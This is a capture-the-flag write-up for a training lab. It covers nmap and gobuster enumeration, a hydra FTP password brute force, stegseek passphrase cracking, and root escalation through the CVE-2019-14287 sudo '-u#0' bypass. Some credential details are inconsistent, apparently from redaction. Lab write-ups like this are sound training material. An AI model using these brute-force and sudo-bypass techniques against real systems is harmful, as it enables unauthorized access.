Rabbithole Lab — Full Writeup
Overview
Target: single Linux (Ubuntu) host with 3 open ports — FTP (21), SSH (22), HTTP (80). The lab is structured in stages: Reconnaissance → Hash Decoding Puzzle → FTP Brute Force → Hidden Information (Steganography) → Gain Access (SSH) → Privilege Escalation → CVE Identification.

1. Reconnaissance

bash
nmap -sC -sV -p- <target_ip>
Results:

21/tcp open  ftp     vsftpd 3.0.5
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Rabbithole | Ironhack
Page hint on port 80: "you better start enumerating directories!"

bash
gobuster dir -u http://<target_ip> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
Found:
/assets — static site files (css/js/images)
/h — start of a nested directory chain

2. Hash Decoding Puzzle
Each nested directory (/h/, /h/a/, /h/a/c/, /h/a/c/k/) contained a <textarea> with an encoded message. Directories spelled out H-A-C-K — the eventual FTP username.

Decoding commands used (CyberChef or CLI):

bash
# Binary
python3 -c "print(''.join(chr(int(b,2)) for b in 'BINARY_STRING'.split()))"

# Decimal
echo "84 104 101 ..." | tr ' ' '\n' | while read n; do printf "\\$(printf '%03o' "$n")"; done

# Hex
echo "54 68 65 72 65 ..." | xxd -r -p

# Base64
echo "BASE64_STRING" | base64 -d

# ROT13
echo "ROT13_STRING" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
Result: FTP username.

3. FTP Brute Force
Final page (/h/a/c/k/) revealed a list of ~90 candidate passwords embedded in the HTML, with the instruction to try them against the username derived from the binary-hash reward.

bash
# Saved the provided password list to passlist.txt, then:
hydra -l user -P passlist.txt -f <target_ip> ftp
Result: password
Key lesson: full rockyou.txt brute force (14M+ entries) was far too slow (estimated 265+ hours) — the lab intended a small, provided wordlist instead.

4. Hidden Information (Steganography)
Logged into FTP and listed files (active mode required — passive mode hung due to blocked data-port range):

bash
curl -u 'user:1qaz!QAZ123' -P - ftp://<target_ip>/
→ Found hacker.jpg (84KB — different/larger than the website's copy).

bash
curl -u 'user:password' -P - ftp://<target_ip>/hacker.jpg -o hacker_ftp.jpg
Metadata/binwalk/strings checks on the image were clean — data was hidden via steghide.

bash
# Installed stegseek to brute-force the steghide passphrase:
sudo apt install steghide stegseek -y
stegseek hacker_ftp.jpg /usr/share/wordlists/rockyou.txt
Result: passphrase = brilliant, extracted file: secret.txt

bash
cat hacker_ftp.jpg.out
Contents: new credentials —
username and password to proceed with ssh

5. Gain Access (SSH)

bash
ssh user@<target_ip>
# password: ********
Successful login as user.

6. Privilege Escalation

bash
sudo -l
Output:

User may run the following commands on ironhack:
    (ALL : ALL) ALL
    (ALL, !root) /bin/bash
(ALL : ALL) ALL grants user full sudo rights — trivial escalation:

bash
sudo -u#0 /bin/bash
(equivalent to sudo su) → root shell obtained.
Root flag:

bash
cat /root/flag.txt

7. CVE Identification
Package exposed to the vulnerability: bash (referring to the /bin/bash sudoers entry)
CVE: CVE-2019-14287 — sudo !root exclusion bypass. Sudoers rules that exclude root via !root can be bypassed by specifying the target user by numeric UID (e.g., -u#0 or -u#-1) instead of by name, since older sudo versions failed to validate excluded users when given a UID directly — exactly the technique used above.

Tools Used
nmap, gobuster, curl — recon & enumeration
CyberChef / manual CLI (xxd, base64, tr) — multi-layer decoding
hydra — FTP credential brute force (targeted wordlist)
exiftool, strings, binwalk — image inspection
steghide, stegseek — steganography extraction
ssh, sudo — access and privilege escalation
